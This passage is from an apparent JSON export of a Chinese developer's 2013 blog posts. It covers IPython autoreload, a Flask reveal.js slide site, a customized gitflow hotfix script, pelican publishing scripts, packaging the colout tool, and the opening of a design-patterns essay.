codecs.open(args['--template'], mode=\"r\", encoding=\"utf-8\") as f:\n            html_content = do.main(f.read())\n    else:\n        html_content = do.main()\n    if args['--output']:\n        with codecs.open(args['--output'], mode=\"w\", encoding=\"utf-8\") as f:\n            f.write(html_content)\n            exit()\n\n    sendMail(\n        args['--mailserver'],\n        args['--username'],\n        args['--password'],\n        args['--mailto'].split(','),\n        args['--subject'],\n        html_content,\n        cc\n    )\n\nif __name__ == '__main__':\n\n    main()\n```\n\n",
    "date": {
      "year": "2013",
      "month": "May",
      "day": "13"
    }
  },
  {
    "id": 264,
    "title": "怎样不退出交互模式自动reload模块",
    "category": "python",
    "tags": [
      "python",
      "ipython",
      "bpython",
      "django-extensions",
      "django shell"
    ],
    "url": "/archives/how-to-not-exit-interactive-mode-autoreload/",
    "content": "####*前言*\n\n我想做python开发的人尤其是django开发都会有一种经历:进入python交互模式(直接 执行python回车)或者进入django-shell调试某功能，然后修改源码，退出交互模式或者djangoshell，重新进入在吧那些模块一一import... 问题是什么呢？浪费时间，为啥不像web 框架那样修改源码自动reload？ \n\n本来我花了2个多礼拜一直在做这件事情，其实原理就是封装ipython到我的shell，然后在我的shell加这个autoreload功能，但是昨晚看ipython源码发现：ipython早已经实现了...\n\n我的系统的实现的源码文件是 /usr/lib64/python2.7/site-packages/IPython/Extensions/ipy_autoreload.py\n\n\n####在ipython交互模式实现\n\n和ipython版本有关，大于0.11 这样加载\n\n```\n%load_ext autoreload\n%autoreload 2\n```\n小于0.11的就要这样加载\n```\nimport ipy_autoreload\n%autoreload 2\n```\n\n####ipython交互模式自动加载 \n\n你总不像每次进入ipython都执行这么2句吧, 那么可以加到ipython的自定义配置里面.因操作系统和ipython版本不同，ipython的用户自定义目录有所不同，增加的配置也 有所不同\n\n首先创建ipython个人配置 \n\n```\nipython profile create\n```\n\ngentoo ~/.ipython  ipython :0.10.2 \n\n配置文件是.ipython/ipy_user_conf.py 添加\n\n```\nimport ipy_autoreload\no.autoexec.append('%autoreload 2')\n\n```\n\nopensuse ~/.config/ipython  :0.13\n\n配置文件是~/.config/ipython/profile_default/ipython_config.py\n\n```\nc.InteractiveShellApp.exec_lines.append('%load_ext autoreload')\nc.InteractiveShellApp.exec_lines.append('%autoreload 2')\n```\n\n####Django shell的实现\n\n遗憾的是改django源码中的core/management/commands/shell.py,没有提供自动reload,但是当你修改了ipython配置 他也是会起作用(这个操作系统有关，下面我会说不起作用的geek方法)\n\nPS： 你还可以使用[django-extensions](https://github.com/dongweiming/django-extensions)中的shell_plus.py\n\n####当你系统有ipython,bpython和默认的python，django shell选择的顺序\n\n* 当你系统没有ipython和bpython，那么就会选择默认的python\n\n* 上面说的shell_plus的遍历列表顺序是bpython->ipython  \n\n* django自带的shell的遍历顺序是ipython->bpython\n\n上面说djangoshell不起作用怎么办？首先看了django/ipython源码(0.13.2)，其实djangoshell甚至django-extensions里面的shell_plus都没有问题，关键是ipython的问题\n\n我只说在用户配置里面的外部模块为啥没有正确执行\n\nipython进入交互模式的流程\n\n1. 当调用ipython，都是通过IPython.frontend.terminal.ipapp的launch_new_instance函数开始\n2. 通过IPython.core.shellapp的InteractiveShellApp类里面的init_code方法去初始化启动后的加载\n3. 在init_code方法会执行self._run_exec_lines(),这个就是上面的模块导入执行\n\ndjangoshell进入交互模式的流程\n\n1. 通过IPython.frontend.terminal.embed的TerminalInteractiveShell类开始\n2. 在TerminalInteractiveShell初始化中,没有执行上面的第三条\n\n解决办法就是暴力修改IPython/frontend/terminal/interactiveshell.py源码 给他加上模块初始化的操作\n\n在326行开始的地方，这样添加一段(包含存在的代码帮你你理解在什么位置添加代码,也就是下面的3-8行)\n\n```\nself.init_usage(usage)                                                 \nself.init_banner(banner1, banner2, display_banner) \nexex_lines = self.config['InteractiveShellApp']['exec_lines']          \nfor line in exex_lines:                                                \n    try:                                                                        \n        self.run_cell(line, store_history=False)                       \n    except:                                                                     \n        pass\n#-------------------------------------------------------------------------          \n# Overrides of init stages                                                          \n#-------------------------------------------------------------------------\n```\n\n\n",
    "date": {
      "year": "2013",
      "month": "May",
      "day": "24"
    }
  },
  {
    "id": 265,
    "title": "仿slid.es的在线PPT编辑网站",
    "category": "reveal.js",
    "tags": [
      "hakimel",
      "python-social-auth",
      "reveal.js",
      "flask-script",
      "flask-login",
      "flask",
      "mongoengine"
    ],
    "url": "/archives/a-web-based-reveal.js-online-PPT/",
    "content": "####前言\n\n[slid.es](https://slid.es)是我最喜欢的前端之一[hakimel](https://github.com/hakimel)的作品，前身叫做rvl.io, 网站已经改版。源于去年年底在上家公司做年终总结PPT，对我这种不搞office，没有美感的小程序员太痛苦了，然后就找到了[reveal.js](https://github.com/hakimel/reveal.js), 后来萌发做个基于它的网站, 其实也是为了练手学习mongoengine和oauth\n\n项目地址 [flask_reveal](https://github.com/dongweiming/flask_reveal)\n\n####它能做什么\n\n* 保存漂亮的在线PPT(我认为的)\n* 记录浏览次数\n* 多种主题和字体\n* 可以把PPT私有化(默认是公开的)\n* 自动保存修改\n* 支持Bitbucket/Google/Github/Instagram/Linkdln/Trello/Tumblr/Stackoverflow oauth/oauth2登陆\n* PPT预览\n\n####使用了什么\n\n* flask\n* mongoengine (忍不了非orm)\n* flask-script (像django那样的命令行启动)\n* 前端js借用我做喜欢的原作者的90%，然后根据我的需要改动，css基本没动\n* [python-social-auth](https://github.com/omab/python-social-auth)的oauth后端，但是它使用的是flask+sqlalchemy，不支持flask+mongoengine，我改写了这部分\n\n####Usage\n\n设置hosts文件\n\n唉，本来申请了很多oauth想放在sae上面，但是遗憾的是新浪不支持，所以只能本地加hosts，让验证后的回调正确返回 linux 在你的/etc/hosts 文件里面添加一行\n\n```\nYOURIP   YOURDOMAIN\n```\n\n复制配置文件然后把你注册的ouauth放进去\n\n```\ncp settings.py.example settings.py\n```\n\n象django那样启动\n\n```\npython manage.py runserver -t 0.0.0.0 -p 80\n```\n\nAnd 访问主页`http://revealcn.sinaapp.com`\n\n\n####使用nginx+uwsgi\n\n这里是我的配置nginx的这段（假设你git clone 后在/home/dongwm/flask_reveal）\n\n```\nserver {\n\t\tlisten 80;\n\t\tserver_name revealcn.sinaapp.com;\n\n\t\taccess_log /var/log/nginx/revealcn.access_log main;\n\t\terror_log /var/log/nginx/revealcn.error_log info;\n\t\tlocation / {\n                include uwsgi_params;\n                uwsgi_pass unix:///tmp/uwsgi.sock;\n        \t}\n\t\tlocation /zongjie {\n\t\troot   /home/dongwm/flask_reveal;\n\t\tindex index.html;\n\t\t}\n\t}\n\n```\n\nuwsgi的xml配置\n\n```\n<uwsgi>\n     <pythonpath>/home/dongwm/flask_reveal</pythonpath>\n     <module>manage</module>\n     <socket>/tmp/uwsgi.sock</socket>    \n    <callable>manager</callable>\n     <master/>\n     <processes>4</processes>       \n     <memory-report/>\n</uwsgi>\n```\n\n这里有个坑，我的gentoo的uwsgi安装后是有插件的，你需要这样启动\n\n```\nuwsgi_python27 -x uwsgi.xml \n```\n\n\n\n\n",
    "date": {
      "year": "2013",
      "month": "May",
      "day": "25"
    }
  },
  {
    "id": 266,
    "title": "多master/develop分支使用gitflow",
    "category": "gitflow",
    "tags": [
      "gitflow"
    ],
    "url": "/archives/duo-master-slash-developfen-zhi-shi-yong-gitflow/",
    "content": "####*前言*\n\n公司都是git作为版本控制，公司一些项目组在用gitflow，但是我们组没有强制，\n但是我上月出了一次事故，总结就是分支管理问题，所以开始强迫自己使用gitflow,\n以前的项目是一个master和一个develop，自己checkout一个分支，然后merge(不理解的可以看看[a-successful-git-branching-model](http://nvie.com/posts/a-successful-git-branching-model/)).\n\n问题出现了: 项目有几个主分支和开发分支，比如master_sina, master_qq. master_buzz ,而gitflow的时候只能指定一个master/develop, 这样你start一个feature/hotfix之前就要去.git/config里面修改\n\\[gitflow \"branch\"\\]项的相关主分支和开发分支，so不方便。看了下源码，给gitflow加点料\n\n####添加功能\n\n* 当你打开了feature/hotfix分支，但是你不想要它了(当然你可以直接git branch -D xx)，使用git flow hotfix/feature delete ,自动帮你删除这个分支，以便你新建其他分支(git flow只容许你一次存在一个hotfix/feature分支)\n* 你想使用gitflow删除其它存在分支嘛？不需要 git branch -D ，你还可以git flow hotfix/feature delete XX \n* 比如我在init的时候指定了master为master_sina,  而当我想创建master_qq的hotfix，我只需要在start的是否给它取名字是'qq_'开头的即可，要是有其它的需要你可以直接在源码里面添加对应的内容\n\n####例子 git-flow-hotfix  我主要标记我修改的部分\n\n```\ninit() {\n  require_git_repo\n  require_gitflow_initialized\n  gitflow_load_settings\n  VERSION_PREFIX=$(eval \"echo `git config --get gitflow.prefix.versiontag`\")\n  PREFIX=$(git config --get gitflow.prefix.hotfix)\n}\n# 增加help的选项说明\nusage() {\n    echo \"usage: git flow hotfix [list] [-v]\"\n    echo \"       git flow hotfix start [-F] <version> [<base>]\"\n    echo \"       git flow hotfix finish [-Fsumpk] <version>\"\n    echo \"       git flow hotfix publish <version>\"\n    echo \"       git flow hotfix delete [branch]\"\n    echo \"       git flow hotfix track <version>\"\n}\ncmd_default() {\n    cmd_list \"$@\"\n}\n\ncmd_list() {\n    DEFINE_boolean verbose false 'verbose (more) output' v\n    parse_args \"$@\"\n\n    local hotfix_branches\n    local current_branch\n    local short_names\n    hotfix_branches=$(echo \"$(git_local_branches)\" | grep \"^$PREFIX\")\n    if [ -z \"$hotfix_branches\" ]; then\n        warn \"No hotfix branches exist.\"\n                warn \"\"\n                warn \"You can start a new hotfix branch:\"\n                warn \"\"\n                warn \"    git flow hotfix start <version> [<base>]\"\n                warn \"\"\n        exit 0\n    fi\n    current_branch=$(git branch --no-color | grep '^\\* ' | grep -v 'no branch' | sed 's/^* //g')\n    short_names=$(echo \"$hotfix_branches\" | sed \"s ^$PREFIX  g\")\n\n    # determine column width first\n    local width=0\n    local branch\n    for branch in $short_names; do\n        local len=${#branch}\n        width=$(max $width $len)\n    done\n    width=$(($width+3))\n\n    local branch\n    for branch in $short_names; do\n        local fullname=$PREFIX$branch\n        local base=$(git merge-base \"$fullname\" \"$MASTER_BRANCH\")\n        local master_sha=$(git rev-parse \"$MASTER_BRANCH\")\n        local branch_sha=$(git rev-parse \"$fullname\")\n        if [ \"$fullname\" = \"$current_branch\" ]; then\n            printf \"* \"\n        else\n            printf \"  \"\n        fi\n        if flag verbose; then\n            printf \"%-${width}s\" \"$branch\"\n            if [ \"$branch_sha\" = \"$master_sha\" ]; then\n                printf \"(no commits yet)\"\n            else\n                local tagname=$(git name-rev --tags --no-undefined --name-only \"$base\")\n                local nicename\n                if [ \"$tagname\" != \"\" ]; then\n                    nicename=$tagname\n                else\n                    nicename=$(git rev-parse --short \"$base\")\n                fi\n                printf \"(based on $nicename)\"\n            fi\n        else\n            printf \"%s\" \"$branch\"\n        fi\n        echo\n    done\n}\n\ncmd_help() {\n    usage\n    exit 0\n}\n\nparse_args() {\n    # parse options\n    FLAGS \"$@\" || exit $?\n    eval set -- \"${FLAGS_ARGV}\"\n    # read arguments into global variables\n    VERSION=$1\n    BRANCH=$PREFIX$VERSION\n    # 这里就是我多master/develop的技巧，我这里会判断要新建的分支的前缀，\n    # 要是qq_开头就会基于master_qq和develop_qq创建分支。所以你可以根据你的需要在这里加一些方法\n    test `expr match \"$@\" \"qq_\"` -ne 0 && MASTER_BRANCH=\"$MASTER_BRANCH\"_qq &&\n    DEVELOP_BRANCH=\"$DEVELOP_BRANCH\"_qq\n}\n\nrequire_version_arg() {\n    if [ \"$VERSION\" = \"\" ]; then\n        warn \"Missing argument <version>\"\n        usage\n        exit 1\n    fi\n}\n\nrequire_base_is_on_master() {\n    if ! git branch --no-color --contains \"$BASE\" 2>/dev/null \\\n            | sed 's/[* ] //g' \\\n            | grep -q \"^$MASTER_BRANCH\\$\"; then\n        die \"fatal: Given base '$BASE' is not a valid commit on '$MASTER_BRANCH'.\"\n    fi\n}\n\nrequire_no_existing_hotfix_branches() {\n    local hotfix_branches=$(echo \"$(git_local_branches)\" | grep \"^$PREFIX\")\n    local first_branch=$(echo ${hotfix_branches} | head -n1)\n    first_branch=${first_branch#$PREFIX}\n    [ -z \"$hotfix_branches\" ] || \\\n        die \"There is an existing hotfix branch ($first_branch). Finish that one first.\"\n}\n# 添加delete 参数，函数需要cmd_开头\ncmd_delete() {\n    if [ \"$1\" = \"\" ]; then\n        # 当不指定参数自动去找存在的未关闭的gitflow分支\n        local hotfix_branches=$(echo \"$(git_local_branches)\" | grep \"^$PREFIX\")\n        test \"$hotfix_branches\" = \"\" && die \"There has not existing hotfix branch can delete\" && exit 1\n    else\n        # 指定参数先判断参数是不是的数量格式\n        test $# != 1 && die \"There only need one parameter indicates the branch to be deleted\" && exit 1\n        hotfix_branches=\"$1\"\n    fi\n    # 当要删除的分支就是当前分支，先checkout到develop分支\n    test \"$hotfix_branches\" = \"$(git_current_branch)\" && echo 'First checkout develp branch'; git_do checkout \"$DEVELOP_BRANCH\"\n    git branch -D  ${hotfix_branches} > /dev/null 2>&1&& echo 'Delete Successed'|| die \"Did not find branch: [$hotfix_branches]\"\n\n}\ncmd_start() {\n    DEFINE_boolean fetch false \"fetch from $ORIGIN before performing finish\" F\n    parse_args \"$@\"\n    BASE=${2:-$MASTER_BRANCH}\n    require_version_arg\n    require_base_is_on_master\n    require_no_existing_hotfix_branches\n\n    # sanity checks\n    require_clean_working_tree\n    require_branch_absent \"$BRANCH\"\n    require_tag_absent \"$VERSION_PREFIX$VERSION\"\n    if flag fetch; then\n        git_do fetch -q \"$ORIGIN\" \"$MASTER_BRANCH\"\n    fi\n    if has \"$ORIGIN/$MASTER_BRANCH\" $(git_remote_branches); then\n        require_branches_equal \"$MASTER_BRANCH\" \"$ORIGIN/$MASTER_BRANCH\"\n    fi\n\n    # create branch\n    git_do checkout -b \"$BRANCH\" \"$BASE\"\n\n    echo\n    echo \"Summary of actions:\"\n    echo \"- A new branch '$BRANCH' was created, based on '$BASE'\"\n    echo \"- You are now on branch '$BRANCH'\"\n    echo\n    echo \"Follow-up actions:\"\n    echo \"- Bump the version number now!\"\n    echo \"- Start committing your hot fixes\"\n    echo \"- When done, run:\"\n    echo\n    echo \"     git flow hotfix finish '$VERSION'\"\n    echo\n}\n\ncmd_publish() {\n    parse_args \"$@\"\n    require_version_arg\n\n    # sanity checks\n    require_clean_working_tree\n    require_branch \"$BRANCH\"\n    git_do fetch -q \"$ORIGIN\"\n    require_branch_absent \"$ORIGIN/$BRANCH\"\n\n    # create remote branch\n    git_do push \"$ORIGIN\" \"$BRANCH:refs/heads/$BRANCH\"\n    git_do fetch -q \"$ORIGIN\"\n\n    # configure remote tracking\n    git config \"branch.$BRANCH.remote\" \"$ORIGIN\"\n    git config \"branch.$BRANCH.merge\" \"refs/heads/$BRANCH\"\n    git_do checkout \"$BRANCH\"\n\n    echo\n    echo \"Summary of actions:\"\n    echo \"- A new remote branch '$BRANCH' was created\"\n    echo \"- The local branch '$BRANCH' was configured to track the remote branch\"\n    echo \"- You are now on branch '$BRANCH'\"\n    echo\n}\n\ncmd_track() {\n    parse_args \"$@\"\n    require_version_arg\n\n    # sanity checks\n    require_clean_working_tree\n    require_branch_absent \"$BRANCH\"\n    git_do fetch -q \"$ORIGIN\"\n    require_branch \"$ORIGIN/$BRANCH\"\n\n    # create tracking branch\n    git_do checkout -b \"$BRANCH\" \"$ORIGIN/$BRANCH\"\n\n    echo\n    echo \"Summary of actions:\"\n    echo \"- A new remote tracking branch '$BRANCH' was created\"\n    echo \"- You are now on branch '$BRANCH'\"\n    echo\n}\n\ncmd_finish() {\n    DEFINE_boolean fetch false \"fetch from $ORIGIN before performing finish\" F\n    DEFINE_boolean sign false \"sign the release tag cryptographically\" s\n    DEFINE_string signingkey \"\" \"use the given GPG-key for the digital signature (implies -s)\" u\n    DEFINE_string message \"\" \"use the given tag message\" m\n    DEFINE_string messagefile \"\" \"use the contents of the given file as tag message\" f\n    DEFINE_boolean push false \"push to $ORIGIN after performing finish\" p\n    DEFINE_boolean keep false \"keep branch after performing finish\" k\n    DEFINE_boolean notag false \"don't tag this release\" n\n    parse_args \"$@\"\n    require_version_arg\n\n    # handle flags that imply other flags\n    if [ \"$FLAGS_signingkey\" != \"\" ]; then\n        FLAGS_sign=$FLAGS_TRUE\n    fi\n\n    # sanity checks\n    require_branch \"$BRANCH\"\n    require_clean_working_tree\n    if flag fetch; then\n        git_do fetch -q \"$ORIGIN\" \"$MASTER_BRANCH\" || \\\n          die \"Could not fetch $MASTER_BRANCH from $ORIGIN.\"\n        git_do fetch -q \"$ORIGIN\" \"$DEVELOP_BRANCH\" || \\\n          die \"Could not fetch $DEVELOP_BRANCH from $ORIGIN.\"\n    fi\n    if has \"$ORIGIN/$MASTER_BRANCH\" $(git_remote_branches); then\n        require_branches_equal \"$MASTER_BRANCH\" \"$ORIGIN/$MASTER_BRANCH\"\n    fi\n    if has \"$ORIGIN/$DEVELOP_BRANCH\" $(git_remote_branches); then\n        require_branches_equal \"$DEVELOP_BRANCH\" \"$ORIGIN/$DEVELOP_BRANCH\"\n    fi\n\n    # try to merge into master\n    # in case a previous attempt to finish this release branch has failed,\n    # but the merge into master was successful, we skip it now\n    if ! git_is_branch_merged_into \"$BRANCH\" \"$MASTER_BRANCH\"; then\n        git_do checkout \"$MASTER_BRANCH\" || \\\n          die \"Could not check out $MASTER_BRANCH.\"\n        git_do merge --no-ff \"$BRANCH\" || \\\n          die \"There were merge conflicts.\"\n          # TODO: What do we do now?\n    fi\n\n    if noflag notag; then\n        # try to tag the release\n        # in case a previous attempt to finish this release branch has failed,\n        # but the tag was set successful, we skip it now\n        local tagname=$VERSION_PREFIX$VERSION\n        if ! git_tag_exists \"$tagname\"; then\n            local opts=\"-a\"\n            flag sign && opts=\"$opts -s\"\n            [ \"$FLAGS_signingkey\" != \"\" ] && opts=\"$opts -u '$FLAGS_signingkey'\"\n            [ \"$FLAGS_message\" != \"\" ] && opts=\"$opts -m '$FLAGS_message'\"\n            [ \"$FLAGS_messagefile\" != \"\" ] && opts=\"$opts -F '$FLAGS_messagefile'\"\n            eval git_do tag $opts \"$VERSION_PREFIX$VERSION\" \"$BRANCH\" || \\\n            die \"Tagging failed. Please run finish again to retry.\"\n        fi\n    fi\n\n    # try to merge into develop\n    # in case a previous attempt to finish this release branch has failed,\n    # but the merge into develop was successful, we skip it now\n    if ! git_is_branch_merged_into \"$BRANCH\" \"$DEVELOP_BRANCH\"; then\n        git_do checkout \"$DEVELOP_BRANCH\" || \\\n          die \"Could not check out $DEVELOP_BRANCH.\"\n\n        # TODO: Actually, accounting for 'git describe' pays, so we should\n        # ideally git merge --no-ff $tagname here, instead!\n        git_do merge --no-ff \"$BRANCH\" || \\\n          die \"There were merge conflicts.\"\n          # TODO: What do we do now?\n    fi\n\n    # delete branch\n    if noflag keep; then\n        # 这个问题很奇怪，在完成分支删除它也会存在当前分支是\n        # 要删除的分支删除报错的问题，所以先切换走\n        test \"$BRANCH\" = \"$(git_current_branch)\" && git_do checkout \"$DEVELOP_BRANCH\"\n        git_do branch -d \"$BRANCH\"\n    fi\n\n    if flag push; then\n        git_do push \"$ORIGIN\" \"$DEVELOP_BRANCH\" || \\\n            die \"Could not push to $DEVELOP_BRANCH from $ORIGIN.\"\n        git_do push \"$ORIGIN\" \"$MASTER_BRANCH\" || \\\n            die \"Could not push to $MASTER_BRANCH from $ORIGIN.\"\n        if noflag notag; then\n            git_do push --tags \"$ORIGIN\" || \\\n                die \"Could not push tags to $ORIGIN.\"\n        fi\n    fi\n\n    echo\n    echo \"Summary of actions:\"\n    echo \"- Latest objects have been fetched from '$ORIGIN'\"\n    echo \"- Hotfix branch has been merged into '$MASTER_BRANCH'\"\n    if noflag notag; then\n        echo \"- The hotfix was tagged '$VERSION_PREFIX$VERSION'\"\n    fi\n    echo \"- Hotfix branch has been back-merged into '$DEVELOP_BRANCH'\"\n    if flag keep; then\n        echo \"- Hotfix branch '$BRANCH' is still available\"\n    else\n        echo \"- Hotfix branch '$BRANCH' has been deleted\"\n    fi\n    if flag push; then\n        echo \"- '$DEVELOP_BRANCH', '$MASTER_BRANCH' and tags have been pushed to '$ORIGIN'\"\n    fi\n    echo\n    }\n```\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "04"
    }
  },
  {
    "id": 267,
    "title": "使用pelican心得",
    "category": "pelican",
    "tags": [
      "pelican",
      "new_post",
      "gh-pages",
      "ghp-import"
    ],
    "url": "/archives/shi-yong-pelicanxin-de/",
    "content": "####前言\n\n最近在用[pelican](http://getpelican.com/)借用[GitHub Pages](http://pages.github.com)搭建我的[小明明s Github](http://dongweiming.github.io), 总结了些心得\n\n####写好Makefile\n\nruby有rake，但是python的好像没什么好用的，还是用Makefile，简单粗暴.先看用的\n\n```\nhelp:                                       \n    @echo 'Makefile for a pelican Web site                                        '\n    @echo '                                                                       '\n    @echo 'Usage:                                                                 '\n    @echo '   make html                        (re)generate the web site          '\n    @echo '   make clean                       remove the generated files         '\n                                                              \nlocal:                                                           \n    ./regen -q                                                  \ngithub:-                                                       \n    ./regen                                                   \n    ghp-import -b master $(OUTPUTDIR)                        \n    git push origin gh-pages:gh-pages-                      \n    git push origin master:master                          \n                                                          \n.PHONY: help github local \n\n```\n\n其中的regen是封装的脚本, 主要是为了加参数让我在本地生成html(其中的文件连接都指到我本地),然后我用python -m SimpleHTTPServer启动:\n\n```\n#!/usr/bin/env bash\n\nset -e\n\nquiet=\"\"\noutput=\"output\"\nif [ \"$1\" = \"-q\" ] ; then\n    shift\n    quiet=\"1\"\n    output=\"output-local\"\n    export OVERRIDE_SITEURL=http://localhost:8000\nfi\n\necho -n \"regenerating...\"\npelican content/ -o $output -s pelicanconf.py \"$@\"\necho done.\n\n```\n\n####我提交到github的方式\n\n上面的脚本已经很明显了，我直接执行make github\n\n其中的[ghp-import](http://github.com/davisp/ghp-import)的介绍很明显了:Easily import docs to your gh-pages branch\n\n但是有个大坑: githubpages是要从你的项目的master分支去获取html页面，而不是gh-pages分支,所以Makefile我修改了下用法\n\n####自动push不需要帐号密码\n\n其实就是添加~./netrc\n\nmachine github.com\nlogin XXX@gmail.com\npassword XXX\n\n####可配置的创建文章\n\n想想octopress的Rakefile，里面定义了一个new_post的方法，额pelican什么都没有，好吧，我用shell做了个\n\n```\n#!/bin/bash\ncategory='设计模式'\ntitle_resource='python设计模式之'\ntags='Design Patterns'\n\nwhile getopts \":c:r:g:s:t:\" opt; do\n  case $opt in\n    c)\n    category=$OPTARG\n      ;;\n    r)\n    title_resource=$OPTARG\n        ;;\n    g)\n    tags=$OPTARG\n        ;;\n    t)\n    title=$OPTARG\n        ;;\n    s)\n    slug=$PTARG\n        ;;\n    ?)\n      echo \"How to use: $0 [-c category] [-r title_resource] [-g tags] [-t title] [-s slug]\" >&2\n      exit 1\n      ;;\n    :)\n      echo \"Option -$OPTARG requires an argument.\" >&2\n      exit 1\n      ;;\n  esac\ndone\ntest \"x$title\" = \"x\" && read -r -p \"Post title [前缀是 ${title_resource}]> \" && title=${REPLY}\ntest \"x$slug\" = \"x\" && read -r -p \"Post slug [比如abstract-factory]> \" && slug=${REPLY}\ntitle=`echo $title | tr \"[:upper:]\" \"[:lower:]\"]`\ntitle=`echo $title | tr -d \"[:blank:]\"`\nslug=`echo $slug | tr \" \" \"-\"`\nfileslug=`echo $slug | tr \"-\" '_'`\ncur_date=`date \"+%Y-%m-%d\"`\nfilename=\"${category}/${fileslug}.md\"\nauthor=`git config --get user.name`\necho \"Creating preview\"\necho \"_________________________________\"\necho \"filename: content/$filename\"\necho \"title: ${title_resource}${title}\"\necho \"slug: python-${slug}\"\necho \"date: ${cur_date}\"\necho \"category: ${category}\"\necho \"tags: ${tags}\"\necho \"_________________________________\"\necho \"\"\nread -r -p \"Are you ready to create(Y or N) >\"\nreply=${REPLY}\nreply=`echo $reply | tr \"[:upper:]\" \"[:lower:]\"]`\ntest \"x$reply\" != \"xy\" && exit 1\ncat > \"content/\"$filename <<EOF\ntitle: ${title_resource}${title}\nslug: python-${slug}\ndate: ${cur_date}\ncategory: ${category}\ntags: ${tags}\n\nEOF\n\n$EDITOR \"content/\"$filename\n\n```\n\n####PS：以上脚本都可以到我的项目[dongweiming.github.io](https://github.com/dongweiming/dongweiming.github.io)的gh-pages分支去拿\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "06"
    }
  },
  {
    "id": 268,
    "title": "我维护的colout",
    "category": "python",
    "tags": [
      "colout"
    ],
    "url": "/archives/wo-wei-hu-de-colout/",
    "content": "####前言\n\n一直在努力进步，其实也在想做点项目，也作了一些东西，最近的计划就是看[celery](https://github.com/celery/celery),[pelican](https://github.com/getpelican/pelican),然后开始看django，看[requests](https://github.com/kennethreitz/requests), 其实任务还是很重的。\n上段时间github转悠，发现一个挺有意思的东西[colout](https://github.com/nojhan/colout)：一个python的命令行显示彩色字符的软件，支持正则，支持各种语法的插件，但是作者呢..怎么说呢 也算是我为了练手,给他维护这个项目,\n\n####我维护的内容\n\n正如我给它修改的README\n\n```\nPypi(the Python Package Index)\n\n    sudo pip install colout\n\nor\n\n    sudo easy_install colout\n\nUbuntu 13.04's ppa\n\n    sudo add-apt-repository ppa:ciici123/colout\n    sudo apt-get update\n    sudo apt-get/aptitude install colout\n\nGentoo overlay\n\n    1. Install layman\n    \n    echo \"app-portage/layman git\" >> $EPREFIX/etc/portage/package.Use\n    sudo emerge layman\n    \n    2. Edit `$EPREFIX/etc/layman/layman.cfg`. Add a line after\n    \n    overlays   : http://www.gentoo.org/proj/en/overlays/repositories.xml\n    \n    so that it becomes\n    \n    overlays   : http://www.gentoo.org/proj/en/overlays/repositories.xml\n                 file://$EPREFIX/var/lib/layman/my-list.xml\n\n    3. Edit `$EPREFIX/var/lib/layman/my-list.xml`.  The content of this file should be:\n    \n    <?xml version=\"1.0\" ?>\n    <repositories version=\"1.0\">\n    <repo priority=\"50\" quality=\"experimental\" status=\"unofficial\">\n        <name>dongwm-overlay</name>\n        <description>dongweiming's gentoo overlay</description>\n        <homepage>https://github.com/dongweiming/dongwm-overlay.git</homepage>\n        <owner>\n            <email>ciici1234@hotmail.com</email>\n        </owner>\n        <source type=\"git\">git://github.com/dongweiming/dongwm-overlay.git</source>\n    </repo>\n    </repositories>\n\n    4. Add this overlay and installation\n    \n    layman -a dongwm-overlay && sudo emerge colout\n```\n\n其实现在已经放到了gentoo的portage主干，你可以直接安装\n\n```\nsudo emerge colout\n```\n\n####也就是说我维护了pypi，ubuntu's ppa和gentoo\n\n这个经验讲起来，很多很多，时间有点长了...\n\n* pypi\n\n我这部分源码是从作者项目拿下来的分支[colout](https://github.com/dongweiming/colout), 里面加了一些必要的东西，还有setup.py的格式\n其中的'classifiers'是从官网文档分析的[classifiers](https://pypi.python.org/pypi?:action=list_classifiers), 而且要注意的是,根据\n最近的[PEP438](http://www.python.org/dev/peps/pep-0438/), 以后的pypi不要容许来自外部软件的网站连接，直接使用pypi的地址已加快速度\n\n#####流程\n\n1. 注册pypi,你可以去网站 也可以python setup.py register\n1. 添加相关文件和setup.py\n1. python setup.py sdist upload  #上传到pypi\n\n技巧:\n\n你可以写.pypirc配置文件就不用每次输入帐号密码了\n\n```\n[distutils]\nindex-servers = pypi\n\n[pypi]\nusername:xxx\npassword:xxx\n```\n\n表示构建dist包后并且上传，当然你还能再加'bdist_egg' 构建eggs\n\n* gentoo 本来就是我的一个layman,但是看来gentoo的开发者也挺喜欢这个小玩意，后来把它放在了主干\n\n流程:\n\n1. 写ebuild脚本 请参看我的[overlay for Gentoo](https://github.com/dongweiming/dongwm-overlay)\n1. 假如你想用第三方的overlay，上面README有安装方法，假如你想放到gentoo主干，继续...\n1. 建立一个Bugzilla帐号\n1. 创建一个bug，填写表单，附件加入你写的那个ebuild脚本，看我的例子[app-misc/colout - a simple command to add colors to a text stream in your terminal](https://bugs.gentoo.org/show_bug.cgi?id=469562)\n\n技巧:\n\n* ubuntu ppa 是最闹残，最无奈的，源文件在我虚拟机里面，有时间我再补\n",
    "date": {
      "year": "2013",
      "month": "June",
      "day": "07"
    }
  },
  {
    "id": 269,
    "title": "给初学python设计模式的pythonista",
    "category": "python",
    "tags": [
      "Design Patterns"
    ],
    "url": "/archives/gei-chu-xue-pythonshe-ji-mo-shi-de-pythonista/",
    "content": "####前言\n\n从2011年5月4日买了第一本《python学习手册》到现在，我学python已经2年多了，python也是我第一门除bash外的语言。\n学'设计模式'这么神秘的东西还是源于去年一次面试，在我说了我想做某个东西，然后有什么思路后，面试官很不屑的问我：你知道设计模式嘛？\n然后我就懵了-从来没听过。我特别赞赏提供良好扩展功能的项目，比如[Sublime Text2](http://www.sublimetext.com/2), 它提供第三方插件功能，你可以使用别人开发的插件，也可以自己写插件，让项目更好的维护和扩展而不需要动基础的代码。\n后来换工作一直在熟悉业务，学一些东西。但是我一直记得这个'设计模式'，上个月花了一些时间去了解，所以有了此文，假如你也想了解'设计模式',也很怕它，你会python，希望本文带给你帮助\n\n我也写了一组python设计模式的文章: [小明明s Github - 设计模式](http://dongweiming.github.io/category/she-ji-mo-shi.html)\n\n####我的角度\n\nGoF（“四人帮”，又称Gang of Four，即Erich Gamma, Richard Helm, Ralph Johnson & John Vlissides四人）的《设计模式》这本书我没看过，我也不怎么会java，看不懂例子.我没有受到其他语言的毒害(因为python是我一开始的语言)，我的角度应该是最靠近python\n\n####什么是设计模式\n\n设计模式其实是一些被很多人反复使用而总结出来的代码设计经验，这些技术被GOF在大概20年前编辑成《编程模式》，其实不要害怕，\n因为**设计模式就在你写代码过程中已经体现了，被叫做'设计模式'只是被很好的总结出来**，\n\n####python程序员的成长\n\n* 